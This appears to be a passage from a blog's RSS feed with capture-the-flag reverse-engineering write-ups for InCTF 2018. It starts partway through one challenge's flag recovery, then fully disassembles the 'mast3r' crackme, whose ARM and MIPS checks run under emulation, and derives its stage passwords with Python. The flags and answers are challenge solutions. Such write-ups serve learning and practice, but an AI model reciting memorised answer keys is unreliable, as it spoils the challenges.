&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;    &amp;gt;&amp;gt;&amp;gt; var_1F = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\x7b\x60\x49\x35\x7a\x25\x75\x35\x64\x4c\x7e&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;
    &amp;gt;&amp;gt;&amp;gt; var_1F
    &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;{`I5z&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;%u&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;5dL~&amp;#39;&lt;/span&gt;
    &amp;gt;&amp;gt;&amp;gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;.join(&lt;span style=&#34;color:#24909d&#34;&gt;map&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;lambda&lt;/span&gt; i: &lt;span style=&#34;color:#24909d&#34;&gt;chr&lt;/span&gt;(&lt;span style=&#34;color:#24909d&#34;&gt;ord&lt;/span&gt;(i)-&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;), var_1F))
    &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;z_H4y$t4cK}&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The string found till now is &lt;code&gt;&amp;quot;inctf{Y0u_F0und_Th3_n3???????????z_H4y$t4cK}&amp;quot;&lt;/code&gt;&lt;br&gt;
Now we need to find &lt;strong&gt;input[22:33]&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:00403B5B          mov     eax, [esp+70h+input]
    .text:00403B5F          add     eax, 22
    .text:00403B62          mov     [esp], eax
    .text:00403B65          call    sub_4024C3
    .text:00403B6A          mov     [esp+70h+var_18], eax
    .text:00403B6E          cmp     [esp+70h+var_18], 0Bh
    .text:00403B73          jz      short loc_403B7F        ; must be true

    [ ... snip ... ]

    .text:004024D8          mov     [ebp+var_10], 0Ah
    .text:0040256E loc_40256E:
    .text:0040256E          mov     eax, [ebp+var_10]
    .text:00402571          mov     eax, [ebp+eax*4+var_6C] ; input[22+var_10]
    .text:00402575          xor     eax, [ebp+var_8]
    .text:00402578          mov     edx, eax
    .text:0040257A          mov     eax, [ebp+var_10]
    .text:0040257D          mov     [ebp+eax*4+var_6C], edx ; input[22+var_10]^var_8
    .text:00402581          mov     eax, [ebp+var_10]
    .text:00402584          mov     eax, [ebp+eax*4+var_6C]
    .text:00402588          mov     [ebp+var_8], eax
    .text:0040258B          mov     eax, [ebp+var_10]
    .text:0040258E          mov     edx, [ebp+eax*4+var_6C]
    .text:00402592          mov     eax, [ebp+var_10]
    .text:00402595          mov     eax, [ebp+eax*4+var_40]
    .text:00402599          cmp     edx, eax
    .text:0040259B          jnz     short loc_4025A1
    .text:0040259D          add     [ebp+status], 1
    .text:004025A1
    .text:004025A1 loc_4025A1:
    .text:004025A1          sub     [ebp+var_10], 1
    .text:004025A5
    .text:004025A5 loc_4025A5:
    .text:004025A5          cmp     [ebp+var_10], 0
    .text:004025A9          jns     short loc_40256E
    .text:004025AB          mov     eax, [ebp+status]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The above code, works like this&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; k = &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; i = &lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;; i &amp;gt;= &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;; --i) {
        k = var_6C[i] ^= k;
        status += var_40[i] == var_6C[i];
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;i.e., &lt;strong&gt;var_6C[i]^var_6C[i+1] == var_40[i]&lt;/strong&gt;&lt;br&gt;
or &lt;strong&gt;var_6C[i] = var_40[i]^var_40[i+1]&lt;/strong&gt;, i &amp;lt; 10&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;    &amp;gt;&amp;gt;&amp;gt; s = &lt;span style=&#34;color:#24909d&#34;&gt;map&lt;/span&gt;(&lt;span style=&#34;color:#24909d&#34;&gt;ord&lt;/span&gt;, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\x6e\x5d\x39\x55\x66\x39\x70\x1e\x41\x15\x7d&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;)
    &amp;gt;&amp;gt;&amp;gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;.join(&lt;span style=&#34;color:#24909d&#34;&gt;map&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;lambda&lt;/span&gt; (i, j): &lt;span style=&#34;color:#24909d&#34;&gt;chr&lt;/span&gt;(i^j), &lt;span style=&#34;color:#24909d&#34;&gt;zip&lt;/span&gt;(s, s[&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;:]+[&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;])))
    &lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;dl3_In_Th|
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So, the input string is &lt;code&gt;&amp;quot;inctf{Y0u_F0und_Th3_n33dl3_In_Th|z_H4y$t4cK}&amp;quot;&lt;/code&gt;, which is also the flag :-)
Finally, the path to the leaf node is&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/inctf18_decoy_1.png&#34; alt=&#34;Image2&#34;  /&gt;&lt;/p&gt;</description>
        </item>
        <item>
        <title>InCTF 2018 - mast3r</title>
        <link>http://localhost:1313/post/inctf-2018-mast3r/</link>
        <pubDate>Sun, 07 Oct 2018 00:00:00 +0530</pubDate>
        
        <guid>http://localhost:1313/post/inctf-2018-mast3r/</guid>
        <description>&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/inctf18_mast3r.png&#34; alt=&#34;Image0&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Opening the file in IDA, we can see the program reads two strings (one for each stage), and validates them.&lt;/p&gt;
&lt;h3 id=&#34;stage-1-validation&#34;&gt;Stage-1 Validation&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:0000000000400E93         mov     rax, 787D6B6F613D7478h
    .text:0000000000400E9D         mov     qword ptr [rbp+var_20], rax
    .text:0000000000400EA1         mov     rax, 3C7E617D73617E3Dh
    .text:0000000000400EAB         mov     [rbp+var_18], rax
    .text:0000000000400EAF         mov     [rbp+var_10], 7D77783Ch
    .text:0000000000400EB6         mov     rax, [rbp+s]    ; first argument
    .text:0000000000400EBA         mov     rdi, rax        ; s
    .text:0000000000400EBD         call    _strlen
    .text:0000000000400EC2         add     rax, 5
    .text:0000000000400EC6         add     rax, rax
    .text:0000000000400EC9         cmp     rax, 32h
    .text:0000000000400ECD         jz      short loc_400EE8
    .text:0000000000400ECF         mov     edi, offset aInvalidLength ; &amp;quot;\nInvalid Length&amp;quot;
    .text:0000000000400ED4         mov     eax, 0
    .text:0000000000400ED9         call    _printf
    .text:0000000000400EDE         mov     edi, 0          ; status
    .text:0000000000400EE3         call    _exit
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cool, we have a magic array at var_20 and the string length must be 25.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:0000000000400EE8         lea     rax, [rbp+var_28]
    .text:0000000000400EEC         mov     rdx, rax
    .text:0000000000400EEF         mov     esi, 0    ; UC_MODE_ARM
    .text:0000000000400EF4         mov     edi, 1    ; UC_ARCH_ARM
    .text:0000000000400EF9         call    _uc_open
    .text:0000000000400EFE         mov     [rbp+var_2C], eax
    .text:0000000000400F01         cmp     [rbp+var_2C], 0
    .text:0000000000400F05         jz      short loc_400F32
    .text:0000000000400F07         mov     eax, [rbp+var_2C]
    .text:0000000000400F0A         mov     edi, eax
    .text:0000000000400F0C         call    _uc_strerror
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Great! it seems like the stage 1 is gonna execute some arm instructions&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:0000000000400F32         mov     rax, [rbp+var_28]
    .text:0000000000400F36         mov     ecx, 7
    .text:0000000000400F3B         mov     edx, 200000h
    .text:0000000000400F40         mov     esi, 10000h
    .text:0000000000400F45         mov     rdi, rax
    .text:0000000000400F48         call    _uc_mem_map
    .text:0000000000400F4D         mov     rax, [rbp+var_28]
    .text:0000000000400F51         mov     ecx, 48h
    .text:0000000000400F56         mov     edx, offset unk_4016B0
    .text:0000000000400F5B         mov     esi, 10000h
    .text:0000000000400F60         mov     rdi, rax
    .text:0000000000400F63         call    _uc_mem_write
    .text:0000000000400F68         mov     rax, [rbp+s]    ; string argument
    .text:0000000000400F6C         mov     rdi, rax        ; s
    .text:0000000000400F6F         call    _strlen
    .text:0000000000400F74         mov     rcx, rax
    .text:0000000000400F77         mov     rax, [rbp+var_28]
    .text:0000000000400F7B         mov     rdx, [rbp+s]
    .text:0000000000400F7F         mov     esi, 11000h
    .text:0000000000400F84         mov     rdi, rax
    .text:0000000000400F87         call    _uc_mem_write
    .text:0000000000400F8C         lea     rax, [rbp+var_20]
    .text:0000000000400F90         mov     rdi, rax        ; s
    .text:0000000000400F93         call    _strlen
    .text:0000000000400F98         mov     rcx, rax
    .text:0000000000400F9B         mov     rax, [rbp+var_28]
    .text:0000000000400F9F         lea     rdx, [rbp+var_20]
    .text:0000000000400FA3         mov     esi, 12000h
    .text:0000000000400FA8         mov     rdi, rax
    .text:0000000000400FAB         call    _uc_mem_write
    .text:0000000000400FB0         mov     rax, [rbp+var_28]
    .text:0000000000400FB4         mov     r8d, 0
    .text:0000000000400FBA         mov     ecx, 0
    .text:0000000000400FBF         mov     edx, 10044h
    .text:0000000000400FC4         mov     esi, 10000h
    .text:0000000000400FC9         mov     rdi, rax
    .text:0000000000400FCC         call    _uc_emu_start
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It maps 2 MiB space at virtual address 0x10000 as RWX. 0x48 bytes from 0x4016b0 are written into the address 0x10000. Then it writes the input string into the next page at 0x11000 and var_20 (magic string) at the virtual address 0x12000. Execution begins at 0x10000 and terminates at 0x10044. Lets see what the arm code at 0x4016b0 does&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-armasm&#34; data-lang=&#34;armasm&#34;&gt;    0x00000000:    mov r0, #0x11000    ; input string
    0x00000004:    mov r5, #0x12000    ; magic string
    0x00000008:    mov fp, #1
    0x0000000c:    mov r1, #0
    0x00000010:    ldrb r2, [r0, r1]
    0x00000014:    eor r2, r2, #5
    0x00000018:    and r2, r2, #0xff
    0x0000001c:    add r2, r2, #7
    0x00000020:    ldrb r3, [r5, r1]
    0x00000024:    and r3, r3, #0xff
    0x00000028:    add r1, r1, #1
    0x0000002c:    cmp r2, r3
    0x00000030:    beq #0x3c
    0x00000034:    mov fp, #0
    0x00000038:    b #0x44
    0x0000003c:    cmp r1, #0x13
    0x00000040:    ble #0x10
    0x00000044:    nop
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Pretty simple, &lt;strong&gt;magic[i] == (input[i]^5)+7&lt;/strong&gt;. And we have&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;    ┌─[x0r19x91@x0r19x91]─[~/Desktop/ctf/inctf]
    └──╼ $ cat mast3r.py
    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;#!/usr/bin/env python&lt;/span&gt;

    &lt;span style=&#34;color:#40ffff&#34;&gt;magic&lt;/span&gt; = [0x78, 0x74, 0x3d, 0x61, 0x6f, 0x6b, 0x7d, 0x78, 0x3d, 0x7e, 0x61, 0x73, 0x7d, 0x61, 0x7e, 0x3c, 0x3c, 0x78, 0x77, 0x7d]

    print &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;.join(map(lambda i: chr(i-7^5), magic))
    ┌─[x0r19x91@x0r19x91]─[~/Desktop/ctf/inctf]
    └──╼ $ python mast3r.py
    th3_mast3r_is_r00tus
    ┌─[x0r19x91@x0r19x91]─[~/Desktop/ctf/inctf]
    └──╼ $
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So, the input for the first stage is &lt;strong&gt;th3_mast3r_is_r00tus&lt;/strong&gt;.&lt;/p&gt;
&lt;h3 id=&#34;stage-2-validation&#34;&gt;Stage-2 Validation&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:0000000000401057        mov     rax, [rbp+input_string]
    .text:000000000040105B        movzx   eax, byte ptr [rax]
    .text:000000000040105E        movsx   eax, al
    .text:0000000000401061        mov     [rbp+var_6C], eax
    .text:0000000000401064        mov     rax, [rbp+input_string]
    .text:0000000000401068        add     rax, 8
    .text:000000000040106C        movzx   eax, byte ptr [rax]
    .text:000000000040106F        movsx   eax, al
    .text:0000000000401072        mov     [rbp+var_68], eax
    .text:0000000000401075        mov     rax, [rbp+input_string]
    .text:0000000000401079        add     rax, 0Dh
    .text:000000000040107D        movzx   eax, byte ptr [rax]
    .text:0000000000401080        movsx   eax, al
    .text:0000000000401083        mov     [rbp+var_64], eax
    .text:0000000000401086        mov     rax, [rbp+input_string]
    .text:000000000040108A        mov     rdi, rax        ; s
    .text:000000000040108D        call    _strlen
    .text:0000000000401092        add     rax, 1
    .text:0000000000401096        add     rax, rax
    .text:0000000000401099        cmp     rax, 32h
    .text:000000000040109D        jz      short loc_4010B8
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nothing to explain here, &lt;strong&gt;var_6C, var_68, var_64 = input_string[0], input_string[8], input_string[13]&lt;/strong&gt;. input_string must be of length 24&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:00000000004010B8 loc_4010B8:
    .text:00000000004010B8         mov     rax, [rbp+input_string]
    .text:00000000004010BC         lea     rdx, [rax+10h]
    .text:00000000004010C0         lea     rax, [rbp+dest]
    .text:00000000004010C4         mov     rsi, rdx        ; src
    .text:00000000004010C7         mov     rdi, rax        ; dest
    .text:00000000004010CA         call    _strcpy
    .text:00000000004010CF         mov     rax, [rbp+input_string]
    .text:00000000004010D3         lea     rcx, [rax+1]
    .text:00000000004010D7         lea     rax, [rbp+var_30]
    .text:00000000004010DB         mov     edx, 7          ; n
    .text:00000000004010E0         mov     rsi, rcx        ; src
    .text:00000000004010E3         mov     rdi, rax        ; dest
    .text:00000000004010E6         call    _strncpy
    .text:00000000004010EB         mov     rax, [rbp+input_string]
    .text:00000000004010EF         lea     rcx, [rax+9]
    .text:00000000004010F3         lea     rax, [rbp+var_20]
    .text:00000000004010F7         mov     edx, 7          ; n
    .text:00000000004010FC         mov     rsi, rcx        ; src
    .text:00000000004010FF         mov     rdi, rax        ; dest
    .text:0000000000401102         call    _strncpy
    .text:0000000000401107         lea     rax, [rbp+dest]
    .text:000000000040110B         mov     esi, offset s2  ; &amp;quot;un1c0rn!&amp;quot;
    .text:0000000000401110         mov     rdi, rax        ; s1
    .text:0000000000401113         call    _strcmp
    .text:0000000000401118         test    eax, eax
    .text:000000000040111A         jz      short loc_401126
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So, we have &lt;strong&gt;dest, var_30, var_20 = input_string[16:], input_string[1:8], input_string[9:16]&lt;/strong&gt; and &lt;strong&gt;dest == &amp;ldquo;un1c0rn!&amp;quot;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:0000000000401126         lea     rax, [rbp+var_40]
    .text:000000000040112A         mov     rdx, rax
    .text:000000000040112D         mov     esi, 4       ; UC_MODE_MIPS32
    .text:0000000000401132         mov     edi, 3       ; UC_ARCH_MIPS
    .text:0000000000401137         call    _uc_open
    .text:000000000040113C         mov     [rbp+var_44], eax
    .text:000000000040113F         cmp     [rbp+var_44], 0
    .text:0000000000401143         jz      short loc_401170
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here I initially mistook the architecture to be x86 because I overlooked the fact that &lt;strong&gt;UC_ARCH_ARM = 1&lt;/strong&gt; is defined in the &lt;strong&gt;enum uc_arch&lt;/strong&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:0000000000401170         movzx   eax, [rbp+var_20]
    .text:0000000000401174         movsx   eax, al
    .text:0000000000401177         mov     [rbp+var_60], eax
    .text:000000000040117A         movzx   eax, [rbp+var_1F]
    .text:000000000040117E         movsx   eax, al
    .text:0000000000401181         mov     [rbp+var_5C], eax

    [ ... snip ... ]

    .text:00000000004012EE         push    0
    .text:00000000004012F0         mov     r9d, 1
    .text:00000000004012F6         mov     r8d, 0
    .text:00000000004012FC         mov     ecx, offset sub_400C26
    .text:0000000000401301         mov     edx, 4       ; UC_HOOK_CODE
    .text:0000000000401306         mov     rdi, rax
    .text:0000000000401309         mov     eax, 0
    .text:000000000040130E         call    _uc_hook_add
    .text:0000000000401313         add     rsp, 10h
    .text:0000000000401317         mov     rax, [rbp+var_40]
    .text:000000000040131B         mov     r8d, 0
    .text:0000000000401321         mov     ecx, 0
    .text:0000000000401326         mov     edx, 100F8h
    .text:000000000040132B         mov     esi, 10000h
    .text:0000000000401330         mov     rdi, rax
    .text:0000000000401333         call    _uc_emu_start
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It then creates a 2 MiB address space at virtual address 0x10000. Code of length 0xf8 is written into 0x10000 from 0x401758. var_30 is written into the next page i.e., at 0x11000. Then the code sets up some registers, as follows&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    regs[11] = input_string[0]      ; r9, t1
    regs[12] = input_string[8]      ; r10, t2
    regs[13] = input_string[13]     ; r11, t3
    regs[15] = input_string[9]      ; r13, t5
    regs[16] = input_string[10]     ; r14, t6
    regs[17] = input_string[11]     ; r15, t7
    regs[26] = input_string[12]     ; r24, t8
    regs[27] = input_string[13]     ; r25, t9
    regs[18] = input_string[14]     ; r16, s0
    regs[19] = input_string[15]     ; r17, s1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;A hook callback 0x400C28 is registered, which gets called during the execution of the code. Execution starts at 0x10000 and terminates at 0x100f8.
Let&amp;rsquo;s take a look at the hook callback&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:0000000000400D48         cmp     [rbp+address], 10010h
    .text:0000000000400D50         jnz     short loc_400D96
    .text:0000000000400D52         lea     rdx, [rbp+var_34]
    .text:0000000000400D56         mov     rax, [rbp+engine]
    .text:0000000000400D5A         mov     esi, 0Bh
    .text:0000000000400D5F         mov     rdi, rax
    .text:0000000000400D62         call    _uc_reg_read
    .text:0000000000400D67         mov     eax, [rbp+var_34]
    .text:0000000000400D6A         cmp     eax, 200h
    .text:0000000000400D6F         jz      short loc_400D96
    .text:0000000000400D71         mov     edi, offset format ; &amp;quot;Try Again!&amp;quot;
    .text:0000000000400D76         mov     eax, 0
    .text:0000000000400D7B         call    _printf

    [ ... snip ... ]

    .text:0000000000400D96         cmp     [rbp+address], 10020h
    .text:0000000000400D9E         jnz     short loc_400DE4
    .text:0000000000400DA0         lea     rdx, [rbp+var_30]
    .text:0000000000400DA4         mov     rax, [rbp+engine]
    .text:0000000000400DA8         mov     esi, 0Ch
    .text:0000000000400DAD         mov     rdi, rax
    .text:0000000000400DB0         call    _uc_reg_read
    .text:0000000000400DB5         mov     eax, [rbp+var_30]
    .text:0000000000400DB8         cmp     eax, 100h

    [ ... snip ... ]

    .text:0000000000400DE4         cmp     [rbp+address], 10030h
    .text:0000000000400DEC         jnz     short loc_400E32
    .text:0000000000400DEE         lea     rdx, [rbp+var_2C]
    .text:0000000000400DF2         mov     rax, [rbp+engine]
    .text:0000000000400DF6         mov     esi, 0Dh
    .text:0000000000400DFB         mov     rdi, rax
    .text:0000000000400DFE         call    _uc_reg_read
    .text:0000000000400E03         mov     eax, [rbp+var_2C]
    .text:0000000000400E06         cmp     eax, 400h

    [ ... snip ... ]

    .text:0000000000400E32         cmp     [rbp+address], 100D0h
    .text:0000000000400E3A         jnz     short loc_400E61
    .text:0000000000400E3C         mov     edi, offset aYouCanDoBetter ; &amp;quot;\nYou can do better!&amp;quot;
    .text:0000000000400E41         mov     eax, 0
    .text:0000000000400E46         call    _printf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here the code validates the registers. When $pc is at 0x10010, the value of regs[11] which is $t1 must be 0x200. At 0x10020, $t2 must be 0x100 and at 0x10030 $t3 should be 0x400. Finally, $pc must not execute at 0x100d0.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s disassemble the MIPS code&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mipsasm&#34; data-lang=&#34;mipsasm&#34;&gt;    0x00000000:     addiu $t0, $zero, 0xa
    0x00000004:     mul $t1, $t1, $t0
    0x00000008:     addiu $t0, $zero, 2
    0x0000000c:     add $t1, $t1, $t0
    0x00000010:     addiu $t0, $zero, 0xa       ; $t1 == 0x200

    0x00000014:     mul $t2, $t2, $t0
    0x00000018:     addiu $t0, $zero, 0xfe
    0x0000001c:     sub $t2, $t2, $t0
    0x00000020:     addiu $t0, $zero, 0x14      ; $t2 == 0x100

    0x00000024:     mul $t3, $t3, $t0
    0x00000028:     addiu $t0, $zero, 4
    0x0000002c:     add $t3, $t3, $t0
    0x00000030:     nop                         ; $t3 == 0x400

    0x00000034:     lui $t0, 1
    0x00000038:     ori $t0, $t0, 0x1000        ; $t0 = 0x11000
    0x0000003c:     lb $t4, ($t0)
    0x00000040:     addiu $t0, $t0, 1
    0x00000044:     addiu $t1, $zero, 0x72
    0x00000048:     bne $t4, $t1, 0xcc
    0x0000004c:     nop
    0x00000050:     lb $t4, ($t0)
    0x00000054:     addiu $t0, $t0, 1
    0x00000058:     addiu $t1, $zero, 0x5f
    0x0000005c:     bne $t4, $t1, 0xcc
    0x00000060:     nop
    0x00000064:     lb $t4, ($t0)
    0x00000068:     addiu $t0, $t0, 1
    0x0000006c:     addiu $t1, $zero, 0x61
    0x00000070:     bne $t4, $t1, 0xcc
    0x00000074:     nop
    0x00000078:     lb $t4, ($t0)
    0x0000007c:     addiu $t0, $t0, 1
    0x00000080:     addiu $t1, $zero, 0x6e
    0x00000084:     bne $t4, $t1, 0xcc
    0x00000088:     nop
    0x0000008c:     lb $t4, ($t0)
    0x00000090:     addiu $t0, $t0, 1
    0x00000094:     addiu $t1, $zero, 0x64
    0x00000098:     bne $t4, $t1, 0xcc
    0x0000009c:     nop
    0x000000a0:     lb $t4, ($t0)
    0x000000a4:     addiu $t0, $t0, 1
    0x000000a8:     addiu $t1, $zero, 0x5f
    0x000000ac:     bne $t4, $t1, 0xcc
    0x000000b0:     nop
    0x000000b4:     lb $t4, ($t0)
    0x000000b8:     addiu $t0, $t0, 1
    0x000000bc:     addiu $t1, $zero, 0x68
    0x000000c0:     bne $t4, $t1, 0xcc
    0x000000c4:     nop
    0x000000c8:     b 0xd4
    0x000000cc:     nop         ; don&#39;t execute the next nop
    0x000000d0:     nop         ; means we need to jump to 0xd4
    0x000000d4:     nop
    0x000000d8:     addiu $t5, $t5, 1
    0x000000dc:     addiu $t6, $t6, 2
    0x000000e0:     addiu $t7, $t7, 3
    0x000000e4:     addiu $t8, $t8, 4
    0x000000e8:     addiu $t9, $t9, 5
    0x000000ec:     addiu $s0, $s0, 6
    0x000000f0:     addiu $s1, $s1, 7
    0x000000f4:     nop
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We have,&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;0x200 = 2+10*$t1 =&amp;gt; $t1 = &amp;lsquo;3&amp;rsquo;&lt;/li&gt;
&lt;li&gt;0x100 = 10*$t2-0xfe =&amp;gt; $t2 = &amp;lsquo;3&amp;rsquo;&lt;/li&gt;
&lt;li&gt;0x400 = 4+$t3*0x14 =&amp;gt; $t3 = &amp;lsquo;3&amp;rsquo;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Therefore, input_string[0] = input_string[8] = input_string[13] = &amp;lsquo;3&amp;rsquo;
The code from 0x34 validates var_30. So, &lt;strong&gt;var_30 = &amp;ldquo;\x72\x5f\x61\x6e\x64\x5f\x68&amp;rdquo;&lt;/strong&gt; which is &lt;strong&gt;r_and_h&lt;/strong&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:00000000004013FF         mov     eax, [rbp+_t5]       ; $t5
    .text:0000000000401402         cmp     eax, 60h
    .text:0000000000401405         jnz     short loc_401437
    .text:0000000000401407         mov     eax, [rbp+_t6]       ; $t6
    .text:000000000040140A         cmp     eax, 6Eh
    .text:000000000040140D         jnz     short loc_401437
    .text:000000000040140F         mov     eax, [rbp+_t7]       ; $t7
    .text:0000000000401412         cmp     eax, 33h
    .text:0000000000401415         jnz     short loc_401437
    .text:0000000000401417         mov     eax, [rbp+_t8]       ; $t8
    .text:000000000040141A         cmp     eax, 7Ah
    .text:000000000040141D         jnz     short loc_401437
    .text:000000000040141F         mov     eax, [rbp+_t9]       ; $t9
    .text:0000000000401422         cmp     eax, 38h
    .text:0000000000401425         jnz     short loc_401437
    .text:0000000000401427         mov     eax, [rbp+_s0]       ; $s0
    .text:000000000040142A         cmp     eax, 79h
    .text:000000000040142D         jnz     short loc_401437
    .text:000000000040142F         mov     eax, [rbp+_s1]       ; $s1
    .text:0000000000401432         cmp     eax, 66h
    .text:0000000000401435         jz      short loc_40144A
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now, we can find out input_string[9:16], which is&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;.join(&lt;span style=&#34;color:#24909d&#34;&gt;map&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;lambda&lt;/span&gt; (i, j): &lt;span style=&#34;color:#24909d&#34;&gt;chr&lt;/span&gt;(j-i), &lt;span style=&#34;color:#24909d&#34;&gt;zip&lt;/span&gt;(&lt;span style=&#34;color:#24909d&#34;&gt;xrange&lt;/span&gt;(&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;8&lt;/span&gt;), [&lt;span style=&#34;color:#3677a9&#34;&gt;0x60&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x6e&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x33&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x7a&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x38&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x79&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x66&lt;/span&gt;])))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So, the string for stage2 is input_string[0] + var_30 + input_string[8] + var_20 + dest = &lt;code&gt;&amp;quot;3r_and_h3_l0v3s_un1c0rn!&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:0000000000401565         mov     edi, offset aStage2Complete ; &amp;quot;\nStage 2 completed!&amp;quot;
    .text:000000000040156A         call    _puts
